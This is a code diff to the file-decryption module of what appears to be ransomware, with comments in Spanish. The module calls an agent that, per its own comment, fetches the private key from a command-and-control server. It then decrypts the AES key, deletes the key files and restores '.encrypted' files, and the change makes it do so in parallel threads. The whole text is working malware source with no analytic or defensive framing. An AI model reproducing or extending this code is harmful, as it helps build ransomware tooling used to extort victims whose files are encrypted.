@@ -3,6 +3,7 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from find_files import find_files
 import agent
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 def load_private_rsa_key(): 
     with open("rsa_private.pem", "rb") as f:
@@ -21,7 +22,7 @@ def decrypt_file(file, aes_key_decrypted):
         with open(file, "rb") as f:
             nonce_and_encrypted_data = f.read()
         nonce = nonce_and_encrypted_data[:12]  # El nonce ocupa los primeros 12 bytes
-        encrypted_data = nonce_and_encrypted_data[12:]
+        encrypted_data = nonce_and_encrypted_data[12:]  # Datos cifrados resto de bytes
         cipher = AES.new(aes_key_decrypted, AES.MODE_CTR, nonce=nonce)
         decrypted_data = cipher.decrypt(encrypted_data)
         with open(file, "wb") as f:
@@ -33,7 +34,6 @@ def decrypt_file(file, aes_key_decrypted):
         print(f"Error descifrando {file}: {e}")
 
 def decrypt_files():
-    # Descifra todos los archivos cifrados encontrados
     agent.get_private_key()  # Obtiene la clave privada del agente desde C2
     files = find_files()  # Obtiene la lista de archivos a descifrar
     rsa_private_key = load_private_rsa_key()  # Carga la clave privada RSA
@@ -42,9 +42,10 @@ def decrypt_files():
     aes_key = decrypt_aes_key_encrypted(rsa_private_key, aes_key_encrypted)  
     os.remove("aes_key_encrypted.bin")  # Elimina la clave AES cifrada después de su uso
     os.remove("rsa_private.pem") # Elimina la clave privada RSA
-    for file in files:
-        # Verifica que el archivo tenga la extensión '.encrypted' 
-        if file.endswith(".encrypted"):  
-            decrypt_file(file, aes_key)  # Llama a la función para descifrar el archivo
+    # Ejecuta el descifrado en múltiples hilos usando ThreadPoolExecutor, descifra archivos ".encrypted"
+    with ThreadPoolExecutor(max_workers = 20) as executor:
+        futures = [executor.submit(decrypt_file, file, aes_key) for file in files if file.endswith(".encrypted")]
+        for future in as_completed(futures):
+            future.result()  # Espera a que cada tarea termine y captura excepciones
     print("Archivos descifrados correctamente.")  
 
